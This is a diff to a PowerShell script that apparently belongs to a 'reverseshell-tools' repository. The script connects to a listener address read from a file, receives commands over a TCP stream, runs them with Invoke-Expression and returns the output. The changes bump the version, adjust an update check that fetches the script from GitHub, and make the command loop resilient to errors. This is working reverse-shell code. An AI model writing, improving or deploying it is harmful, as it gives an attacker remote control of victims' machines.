@@ -1,4 +1,4 @@
-#1.0
+#1.1
 
 try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
 catch
@@ -159,7 +159,7 @@ function RunModule ($Action)
 	#/ver
 	if ($SplitAction[0] -eq "ver")
 	{
-		if ($SplitAction[1] -eq $null) { WriteTCPMessage ("`nVersion: " + (Get-Content $PSCommandPath -TotalCount 1).Substring(1) + "`nNewest: " + (([string](Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/active.ps1").Content).Split()[0]).Substring(2) + "`n") }
+		if ($SplitAction[1] -eq $null) { WriteTCPMessage ("`nVersion: " + (Get-Content $PSCommandPath -TotalCount 1).Substring(1) + "`nNewest: " + (([string](Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UltraAlex00/reverseshell-tools/main/active.ps1").Content).Split()[0]).Substring(1) + "`n") }
 		elseif ($SplitAction[1] -eq "update")
 		{
 			try
@@ -244,19 +244,22 @@ WriteTCPMessage ''
 while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
 {
 	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-	if ($Command.Substring(0, 1) -eq "/") { RunModule $Command.Substring(1) }
-	else
-	{
-		$Output = try
+	try {
+		if ($Command.Substring(0, 1) -eq "/") { RunModule $Command.Substring(1) }
+		else
 		{
-			Invoke-Expression $Command 2>&1 | Out-String
+			$Output = try
+			{
+				Invoke-Expression $Command 2>&1 | Out-String
+			}
+			catch
+			{
+				$_ | Out-String
+			}
+			WriteTCPMessage ($Output)
 		}
-		catch
-		{
-			$_ | Out-String
-		}
-		WriteTCPMessage ($Output)
 	}
+	catch { WriteTCPMessage "" -NoNewLine }
 }
 $StreamWriter.Close()
 Clear-Host
